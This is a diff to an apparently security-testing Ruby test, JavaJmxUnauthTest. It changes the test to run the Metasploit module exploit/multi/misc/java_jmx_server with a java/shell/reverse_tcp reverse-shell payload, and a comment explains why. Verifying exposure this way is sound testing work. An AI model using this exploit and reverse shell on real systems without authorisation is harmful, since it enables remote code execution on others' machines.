@@ -64,10 +64,17 @@ class JavaJmxUnauthTest < PostProvisionTest
                          'REACHABLE')
     end
 
-    test_msf_exploit('exploit/multi/misc/java_jmx_server',
-                     rport: self.port,
-                     expect_privilege: 'user_rwx',
-                     tier: 3)
+    # The module is Platform => java / Arch => ARCH_JAVA: it loads an MBean that
+    # runs a Java payload inside the target JVM, so the only compatible payloads
+    # open a session (java/shell, java/meterpreter) — there is no cmd/ command
+    # payload for test_msf_exploit's sentinel model to drive, which is why the
+    # sentinel never appeared. Prove RCE through a backgrounded java command
+    # shell instead and read `id` back from it.
+    test_msf_exploit_session('exploit/multi/misc/java_jmx_server',
+                             rport: self.port,
+                             payload: 'java/shell/reverse_tcp',
+                             expect_privilege: 'user_rwx',
+                             tier: 3)
   end
 end
 
